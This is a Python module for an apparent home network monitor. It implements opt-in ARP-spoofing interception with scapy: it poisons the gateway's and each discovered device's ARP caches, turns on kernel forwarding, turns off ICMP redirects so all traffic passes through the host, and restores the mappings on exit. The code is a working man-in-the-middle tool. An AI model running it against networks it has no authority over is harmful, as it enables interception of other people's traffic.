"""ARP-spoofing interceptor for the network monitor (opt-in, PT_MITM=1).

On a switched LAN this host only sees device discovery, broadcast/multicast and
its own traffic — a switch never delivers it other devices' unicast frames. This
module gets around that *without* extra hardware by poisoning ARP caches:

  * it tells each target device  "the gateway is at <our MAC>"
  * it tells the gateway         "the target  is at <our MAC>"

so both directions of every target's traffic are routed through this host. With
kernel IP-forwarding enabled the packets are relayed on to their real next hop,
so connectivity is preserved while ``NetworkSniffer`` (promiscuous) now sees the
frames and attributes them per device.

This is intrusive and noisy, and is only legal/ethical on a network you own. It
is OFF by default. On shutdown the original ARP mappings are restored.

Targets are read live from the DeviceRegistry each cycle, so devices discovered
after start are picked up automatically.
"""

from __future__ import annotations

import logging
import threading
import time

from . import config

log = logging.getLogger("packettracer.mitm")


# --- sysctl save/restore ----------------------------------------------------
def _read_sysctl(path: str) -> str | None:
    try:
        with open(path) as fh:
            return fh.read().strip()
    except OSError:
        return None


def _write_sysctl(path: str, value: str) -> bool:
    try:
        with open(path, "w") as fh:
            fh.write(value)
        return True
    except OSError as e:
        log.debug("sysctl write %s=%s failed: %s", path, value, e)
        return False


_IP_FORWARD = "/proc/sys/net/ipv4/ip_forward"
_REDIRECTS = (
    "/proc/sys/net/ipv4/conf/all/send_redirects",
    "/proc/sys/net/ipv4/conf/default/send_redirects",
)


class ArpSpoofer:
    """Continuously poisons target<->gateway ARP, relaying via kernel forwarding."""

    def __init__(self, registry, iface: str | None = None) -> None:
        self.registry = registry
        self.iface = iface
        self.our_mac: str | None = None
        self.gateway_ip: str | None = None
        self._explicit_targets = {
            t.strip() for t in config.MITM_TARGETS.split(",") if t.strip()
        }
        self._thread: threading.Thread | None = None
        self._running = threading.Event()
        self._saved: dict[str, str] = {}
        self._active_targets: dict[str, str] = {}  # ip -> mac currently poisoned

    # -- introspection -------------------------------------------------------
    def is_active(self) -> bool:
        return self._running.is_set()

    def status(self) -> dict:
        return {
            "active": self._running.is_set(),
            "gateway_ip": self.gateway_ip,
            "targets": sorted(self._active_targets.keys()),
            "target_count": len(self._active_targets),
        }

    # -- lifecycle -----------------------------------------------------------
    def start(self) -> None:
        from scapy.all import conf, get_if_hwaddr

        iface = self.iface or config.IFACE or conf.iface
        self.iface = str(iface)
        self.our_mac = get_if_hwaddr(self.iface).lower()

        # Route victims' traffic on to its real destination, and stop the kernel
        # emitting ICMP redirects (which would tell victims to bypass us).
        self._saved[_IP_FORWARD] = _read_sysctl(_IP_FORWARD) or "0"
        _write_sysctl(_IP_FORWARD, "1")
        for path in _REDIRECTS:
            cur = _read_sysctl(path)
            if cur is not None:
                self._saved[path] = cur
                _write_sysctl(path, "0")

        self._running.set()
        self._thread = threading.Thread(target=self._loop, name="arp-spoof", daemon=True)
        self._thread.start()
        log.warning(
            "ARP-spoof interception ENABLED on %s (our MAC %s). This is intrusive; "
            "use only on a network you own. ARP tables restored on exit.",
            self.iface, self.our_mac,
        )

    def stop(self) -> None:
        if not self._running.is_set():
            return
        self._running.clear()
        if self._thread is not None:
            self._thread.join(timeout=2.0)
        self._restore_arp()
        for path, value in self._saved.items():
            _write_sysctl(path, value)
        log.info("ARP-spoof interception stopped; ARP caches and sysctls restored.")

    # -- internals -----------------------------------------------------------
    def _resolve_gateway(self) -> str | None:
        gws = self.registry.gateways()
        return sorted(gws)[0] if gws else None

    def _current_targets(self) -> dict[str, str]:
        """Live {target_ip: target_mac} from the registry, minus self/gateway."""
        out: dict[str, str] = {}
        local = self.registry.local_ips()
        for dev in self.registry.snapshot():
            ip, mac = dev["ip"], dev["mac"]
            if not mac or dev["is_self"] or dev["is_gateway"]:
                continue
            if ip in local or ip == self.gateway_ip:
                continue
            if self._explicit_targets and ip not in self._explicit_targets:
                continue
            out[ip] = mac
        return out

    def _loop(self) -> None:
        from scapy.layers.l2 import ARP, Ether
        from scapy.sendrecv import sendp

        while self._running.is_set():
            self.gateway_ip = self._resolve_gateway()
            gw_mac = self.registry.mac_for(self.gateway_ip) if self.gateway_ip else None
            if self.gateway_ip and gw_mac:
                targets = self._current_targets()
                self._active_targets = dict(targets)
                frames = []
                for tip, tmac in targets.items():
                    # Tell the target: gateway_ip is-at our_mac.
                    frames.append(
                        Ether(dst=tmac) / ARP(op=2, psrc=self.gateway_ip,
                                              hwsrc=self.our_mac, pdst=tip, hwdst=tmac)
                    )
                    # Tell the gateway: target_ip is-at our_mac.
                    frames.append(
                        Ether(dst=gw_mac) / ARP(op=2, psrc=tip,
                                                hwsrc=self.our_mac, pdst=self.gateway_ip,
                                                hwdst=gw_mac)
                    )
                if frames:
                    try:
                        sendp(frames, iface=self.iface, verbose=0)
                    except Exception as e:  # noqa: BLE001 - send is best-effort
                        log.debug("poison send failed: %s", e)
            else:
                self._active_targets = {}

            waited = 0.0
            while self._running.is_set() and waited < config.MITM_INTERVAL_SEC:
                time.sleep(0.25)
                waited += 0.25

    def _restore_arp(self) -> None:
        """Send the real mappings several times so victims un-learn our MAC."""
        from scapy.layers.l2 import ARP, Ether
        from scapy.sendrecv import sendp

        gw_mac = self.registry.mac_for(self.gateway_ip) if self.gateway_ip else None
        if not self.gateway_ip or not gw_mac or not self._active_targets:
            return
        frames = []
        for tip, tmac in self._active_targets.items():
            frames.append(
                Ether(dst=tmac) / ARP(op=2, psrc=self.gateway_ip,
                                      hwsrc=gw_mac, pdst=tip, hwdst=tmac)
            )
            frames.append(
                Ether(dst=gw_mac) / ARP(op=2, psrc=tip,
                                        hwsrc=tmac, pdst=self.gateway_ip, hwdst=gw_mac)
            )
        try:
            sendp(frames * config.MITM_RESTORE_ROUNDS, iface=self.iface, verbose=0)
        except Exception as e:  # noqa: BLE001
            log.debug("ARP restore failed: %s", e)
